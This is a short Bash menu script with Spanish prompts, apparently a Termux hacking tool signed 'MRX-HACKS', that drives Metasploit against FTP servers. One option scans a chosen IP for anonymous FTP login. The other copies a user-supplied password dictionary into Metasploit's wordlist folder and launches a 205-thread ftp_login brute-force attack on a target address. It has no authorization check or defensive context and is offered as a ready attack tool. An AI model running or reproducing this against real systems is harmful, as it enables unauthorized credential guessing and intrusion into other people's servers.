#! /bin/bash

clear
echo -e "\e[1;33m __  __ ____  _____ _____ _____\e[0m\e[1;34m ___   _\e[0m"
echo -e "\e[1;33m|  \/  / ___||  ___|_   _|  _  |\e[0m\e[1;34m___ \/ |\e[0m"
echo -e "\e[1;33m| |\/| \___ \| |_    | | | |_) |\e[0m\e[1;34m__) /| |\e[0m"
echo -e "\e[1;33m| |  | |___) |  _|   | | |  __/\e[0m\e[1;34m/ __/ | |\e[0m"
echo -e "\e[1;33m|_|  |_|____/|_|     |_| |_|\e[0m  \e[1;34m|_____/|_|\e[0m"
echo ""
echo -e "\e[1;34m==============================================\e[0m"
echo -e " \e[1;31mRequisito : Tener instalado Metasploit\e[0m"
echo -e "\e[1;34m==============================================\e[0m"
while :
do
echo ""
setterm -foreground cyan
echo "*Escojer una opcion"
echo ""
echo -e "\e[1;37m[1]\e[0m\e[1;32mEscaneo Server FTP a una IP\e[0m"
echo -e "\e[1;37m[2]\e[0m\e[1;32mAtacar Server FTP a una IP\e[0m"
echo -e "\e[1;37m[00]\e[0m\e[1;32mSalir\e[0m"
echo -e -n "\e[1;37m[#]Opcion >>\e[0m "
read opcion
case $opcion in
1)
#! /bin/bash
clear
setterm -foreground red
echo ""
cat baner.txt
echo ""
echo -n -e "\e[1;37m[~]\e[0m\e[1;33mIngrese la IP Obletivo >>\e[0m "
read ip
echo -n -e "\e[1;37m[~]\e[0m\e[1;33mIngrese el puerto [21] >>\e[0m "
read puerto
echo -n -e "\e[1;37m[~]\e[0m\e[1;33mIngrese la cantidad de conexion [55] >>\e[0m "
read conect
echo ""
echo "-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#"
sleep 1
echo ""
echo -e "\e[1;37m[#]Cargando Metasploit ...\e[0m"
echo ""
msfconsole -q -x "use auxiliary/scanner/ftp/anonymous;set RHOST $ip;set RPORT $puerto;set THREADS $conect;run"
;;
2)
#! /bin/bash
clear
setterm -foreground green
echo ""
cat banner.txt
echo ""
figlet Brute FTP
echo ""
echo -n -e "\e[1;32m[~]\e[0m\e[1;37mIngrese la IP Obletivo >>\e[0m "
read a
echo -n -e "\e[1;32m[~]\e[0m\e[1;37mIngrese el puerto [21] >>\e[0m "
read b
echo -n -e "\e[1;32m[~]\e[0m\e[1;37mIngrese la cantidad de conexion [205] >>\e[0m "
read c
echo -n -e "\e[1;32m[~]\e[0m\e[1;37mIngrese el Diccionario txt >>\e[0m "
read d
echo ""
cp $d "/data/data/com.termux/files/usr/opt/metasploit-framework/data/wordlists"
echo -e "\e[1;34m--------------------------------------------------\e[0m"
echo -e "\e[1;31mCopiando $d al Directorio /data/wordlist\e[0m"
echo -e "\e[1;34m--------------------------------------------------\e[0m"
sleep 1
echo ""
echo -e "\e[1;37m[#]Cargando Metasploit ...\e[0m"
echo ""
msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login;set RHOST $a;set THREADS 205;set USERPASS_FILE $d;set VERBOSE false;run"
;;
00)
#! /bin/bash
echo ""
echo -e "\e[1;33m[~]\e[0m\e[1;35mHa salido de la Herramienta, By.MRX-HACKS\e[0m"
sleep 1
exit
;;
esac
done
